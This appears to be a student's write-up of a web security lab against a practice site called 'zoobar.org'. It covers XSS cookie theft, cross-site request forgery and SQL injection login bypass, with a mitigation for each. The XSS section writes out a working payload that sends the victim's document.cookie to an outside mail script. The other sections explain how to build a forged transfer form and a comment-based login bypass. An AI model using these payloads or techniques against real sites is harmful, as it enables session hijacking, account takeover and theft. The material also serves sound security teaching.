@@ -1,0 +1,77 @@
+# Attack A: Cookie Theft 
+
+## Vulnerability
+Usage of superglobals in php. In the below line, the $_GET[‘user] will be replaced by the user input. A well-crafted user input could therefore execute malicious scripts such as mailing cookies to the attacker. 
+<input type="text" name="user" value="<?php echo stripslashes($_GET['user']);?>" size=10>
+
+## How your attack works
+The starting point of part-A “http://zoobar.org/users.php?user=\%22\%3E\%3Cscript\%3Ealert\%28document.cookie\%29;\%3C/script\%3E” 
+basically uses a crafted input to display the cookie on the browser. Basically the vulnerable line is converted to 
+<input type="text" name="user" value=“”><script>alert(document.cookie);</script>" size=10>. 
+
+Now we take the help of the input provided by zoomail.org script to craft the input (url-encoded) to be 
+“http://zoobar.org/users.php?user=\%22\%3E\%3Cscript\%3Enew\%20Image().src\%3D\%27http\%3A\%2F\%2Fzoomail.org\%2Fsendmail.php\%3Fnetid\%3Draghavan9\%26payload\%3D\%27\%2Bdocument.cookie\%2B\%27\%26random\%3D\%27\%2BMath.random()\%3Bwindow.location.href\%3D\%27\%2Fusers.php\%27\%3B\%3C\%2Fscript\%3E”. 
+This will convert the input vulnerable line to be 
+<input type="text" name="user" value=""><script>new Image().src='http://zoomail.org/sendmail.php?netid=raghavan9&payload='+document.cookie+'&random='+Math.random();window.location.href='/users.php';</script>" size=10>
+
+With the help of zoomail.org/sendmail.php, we identified the script required to mail a payload. 
+In order to avoid any other output on the page(eg: problems caused by size=10) and to avoid the warning message, we are reopening the users.php page 
+by setting the location attribute of the browser window. 
+
+## How to mitigate the vulnerability
+Sanitize and validate user input before using it to render a php document on a browser. One simple solution for that is to use htmlentities(). 
+
+# Attack B: Cross-Site Request Forgery
+
+## Vulnerability
+
+If a user is logged into the zoobar.org website, then the browser will have stored cookies and other information for 
+that authentication. Since browser cookies are used across windows and browsing sessions, submitting a request form 
+to the vulnerable site from another malicious site will make the request look like it is authenticated from the view 
+of the vulnerable site. The site has no way of distinguishing between a forged request and a real one.
+In line 8 of the transfer.php, there is a SQL line that will get the zoobar credit balance from the stored user id
+and the future lines will operate on that balance. Therefore, all requests will occur to the user that is logged in, 
+no matter if it is the user actually making those requests or not.
+
+## How your attack works
+
+As long as a form with correct format is sent to transfer.php, the zoobar credits will be transferred. Thus, by putting 
+a hidden autosubmitting form into an invisible iframe, we can send a request to transfer '10' zoobar credits to the user
+'attacker' to transfer.php, thus stealing all the currently logged in user's zoobar credits.
+All of the input fields must have the correct names as shown in the transfer.php code. Zoobar credit amount (10) goes in an <input>
+with name "zoobars", attacker goes in an <input> with name "recipient", and the submit must have name "submission" so that 
+the transfer.php code executes with the right values. 
+Then, the form is automatically submitted by some JavaScript and the page is redirected to 'http://www.bing.com'.
+
+## How to mitigate the vulnerability
+
+One way to prevent cross site request forgery attacks is to have a secret authentication token. This token is not included
+in the cookies, like using a hidden input field, and should not be able to be forged by the attacker. The server would then 
+validate this token every time a sensitive request is made to the webpage, which would provide security that the actual 
+user who logged into the session is the one making the request.
+
+
+# Attack C: SQL Injection
+
+## Vulnerability
+Vulnerability lies in _checkLogin function when verifying if username and password matches. 
+Here $username is used instead of $quoteduser, thus exposing an SQL injection vulnerability. 
+
+## How your attack works
+The HTML form accepts as input the username to login. When the form is submitted the username is appended with '-- before sending to the destination php. 
+We also use a random number to make sure this vulnerability works when executed multiple times. 
+The submitted form triggers a _addRegistration (because submit name is ’submitregistration’). 
+There is also an invisible password field to supply a random password to the php destination. 
+In addRegistration, the check to identify existing user fails since we add a ‘--<random#> to the username. 
+Hence a new user is registered. Now the flow goes into _checkLogin where we check if the username and password matches. 
+Here since the code doesn’t quote the input, the SQL query becomes 
+SELECT * FROM Person WHERE Username = ‘<username>’-- <random#> AND ... 
+
+-- is treated as a comment in SQL and the rest of the query is ignored and the query just checks 
+if the user is present in the database without checking the password. This results in a sucessful login. 
+Since we are redirecting the page to index.php, we get logged into the system and index.php is displayed. 
+
+## How to mitigate the vulnerability
+Use good coding practices to avoid SQL injection attacks like 
+- quoting the user input
+- using object relational mapping
